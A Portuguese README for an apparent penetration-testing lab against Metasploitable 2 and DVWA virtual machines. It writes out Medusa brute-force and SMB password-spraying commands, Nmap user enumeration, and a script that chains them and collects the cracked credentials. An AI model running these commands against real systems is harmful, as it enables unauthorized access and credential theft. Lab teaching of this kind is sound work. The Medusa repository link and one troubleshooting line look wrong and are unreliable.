# 📜 Scripts de Automação e Referência

Esta pasta contém scripts e guias de comandos para os testes de penetração.

---

## 📝 Arquivos

### `medusa-commands.sh`
Referência completa de **todos os comandos Medusa** utilizados no projeto.

**Conteúdo:**
1. Ataque FTP - Brute Force
2. Ataque DVWA - Brute Force em formulário web
3. SMB - Enumeração de usuários
4. SMB - Password Spraying
5. Nmap - Discovery e mapeamento
6. Análise de resultados
7. Scripts de execução automática
8. Troubleshooting

**Como usar:**
```bash
# Ver referência
cat medusa-commands.sh

# Executar um comando específico
bash medusa-commands.sh | grep "ATAQUE FTP" -A 5
```

### `nmap-commands.sh`
Referência completa de **todos os comandos Nmap** para reconnaissance.

**Conteúdo:**
1. Ping Scan (descoberta de hosts)
2. Port Scan (top portas)
3. Full Port Scan (todas as portas)
4. OS Detection
5. Script Scanning
6. Aggressive Scan
7. Output Formats
8. Timing Templates
9. Exemplos práticos
10. Filter & Analysis

**Como usar:**
```bash
# Ver referência
cat nmap-commands.sh

# Copiar comando e ajustar IP
```

---

## 🚀 Scripts de Automação

### Executar Todos os Testes

Crie um script `run-all-tests.sh`:

```bash
#!/bin/bash

TARGET_IP="192.168.1.100"
WORDLIST_PASS="wordlists/common-passwords.txt"
WORDLIST_USERS="wordlists/users.txt"

echo "=== INICINDO BATERIA DE TESTES ==="
echo ""

# Teste 1: Nmap discovery
echo "[1/5] Nmap Discovery..."
nmap -sn 192.168.1.0/24 -o results/nmap-discovery.txt
echo "✓ Concluído"

# Teste 2: Nmap port scan
echo "[2/5] Nmap Port Scan..."
nmap -sV --top-ports 20 $TARGET_IP -o results/nmap-ports.txt
echo "✓ Concluído"

# Teste 3: SMB enumeration
echo "[3/5] SMB Enumeration..."
nmap -p 139,445 --script smb-enum-users.nse $TARGET_IP -o results/nmap-smb.txt
echo "✓ Concluído"

# Teste 4: FTP brute force
echo "[4/5] FTP Brute Force..."
medusa -h $TARGET_IP -u msfadmin -P $WORDLIST_PASS -M ftp -v 6 -O results/medusa-ftp.log
echo "✓ Concluído"

# Teste 5: SMB password spraying
echo "[5/5] SMB Password Spraying..."
medusa -h $TARGET_IP -U $WORDLIST_USERS -p msfadmin -M smbnt -v 6 -O results/medusa-smb.log
echo "✓ Concluído"

echo ""
echo "=== TESTES COMPLETADOS ==="

# Resumo
echo ""
echo "=== RESUMO DE SUCESSOS ==="
grep "SUCCESS" results/medusa-*.log 2>/dev/null || echo "Nenhum sucesso encontrado"
```

**Usar:**
```bash
chmod +x run-all-tests.sh
./run-all-tests.sh
```

---

## 📊 Análise de Resultados

### Extrair Sucessos
```bash
# Ver todas as credenciais descobertas
grep "SUCCESS" results/medusa-*.log

# Contar quantas
grep "SUCCESS" results/medusa-*.log | wc -l
```

### Gerar Relatório
```bash
# Consolidar tudo em um arquivo
cat results/nmap-*.txt > report-nmap.txt
cat results/medusa-*.log > report-medusa.txt

# Criar relatório markdown
cat > report.md << EOF
# Relatório de Testes

## Serviços Descobertos
$(cat results/nmap-ports.txt)

## Usuários Enumerados
$(grep "User:" results/nmap-smb.txt)

## Credenciais Descobertas
$(grep "SUCCESS" results/medusa-*.log)
EOF
```

---

## 🔧 Instalação de Dependências

Se alguma ferramenta estiver faltando:

```bash
# Atualizar repositórios
sudo apt update && sudo apt upgrade -y

# Instalar Medusa
sudo apt install -y medusa

# Instalar Nmap
sudo apt install -y nmap

# Instalar Hydra (alternativa a Medusa)
sudo apt install -y hydra

# Instalar Metasploit (opcional)
sudo apt install -y metasploit-framework

# Instalar ferramentas web
sudo apt install -y python3-pip
pip3 install requests paramiko
```

---

## ⚡ Exemplos Rápidos

### FTP Brute Force (1 minuto)
```bash
medusa -h 192.168.1.100 -u msfadmin -P wordlists/common-passwords.txt -M ftp -v 6
```

### SMB Enumeration (30 segundos)
```bash
nmap -p 139,445 --script smb-enum-users.nse 192.168.1.100
```

### SMB Password Spraying (1 minuto)
```bash
medusa -h 192.168.1.100 -U wordlists/users.txt -p password123 -M smbnt -v 6
```

### DVWA Brute Force (30 segundos)
```bash
medusa -h 192.168.1.101 -u admin -P wordlists/common-passwords.txt -M web-form \
  -m FORM:/login.php -m FORM-USERNAME:username -m FORM-PASSWORD:password -v 6
```

---

## 📋 Checklist Antes de Executar

- [ ] Kali Linux iniciada
- [ ] Metasploitable 2 iniciada
- [ ] VMs conectadas em rede Host-only
- [ ] Ping funcionando entre as VMs
- [ ] Medusa instalado (`medusa -V`)
- [ ] Nmap instalado (`nmap --version`)
- [ ] Wordlists localizadas (`ls wordlists/`)

---

## 🐛 Troubleshooting

### Medusa: Command not found
```bash
sudo apt install medusa
```

### Nmap: Cannot find host
```bash
# Verificar conectividade
ping 192.168.1.100

# Arquivo /etc/hosts
cat /etc/hosts
```

### Medusa: No modules loaded
```bash
# Verificar módulos disponíveis
medusa -d

# Instalar módulos desnecessários
sudo apt install --reinstall medusa
```

---

## 📚 Referências

- [Medusa GitHub](https://github.com/jmk-foexchange/medusa)
- [Nmap Manual](https://nmap.org/book/)
- [Kali Linux Tools](https://tools.kali.org/)

---

**Última atualização:** 22 de março de 2026
